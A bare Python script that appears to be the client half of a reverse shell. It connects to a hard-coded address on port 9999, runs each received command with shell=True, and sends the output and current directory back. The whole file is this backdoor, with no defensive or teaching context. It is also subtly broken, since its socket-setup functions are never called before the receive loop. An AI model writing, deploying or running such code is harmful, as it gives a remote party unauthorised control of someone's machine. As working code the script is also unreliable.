import socket
import  os
import subprocess

server = "192.168.0.105"
port = 9999

def create_socket():
    global s
    try:
        s = socket.socket()
    except:
        print("Error: " + str(socket.error))

def connect_socket():
    print("connecting socket with ip: {} at port: {}".format(server,str(port)))
    s.connect((server,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0 and (not(data[:2].decode("utf-8") == "cd")):
        client_response = subprocess.Popen(data.decode("utf-8"),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte = client_response.stdout.read() + client_response.stderr.read()
        output_str = output_byte.decode("utf-8")
        currentWD = os.getcwd()
        s.send((output_str + currentWD).encode())
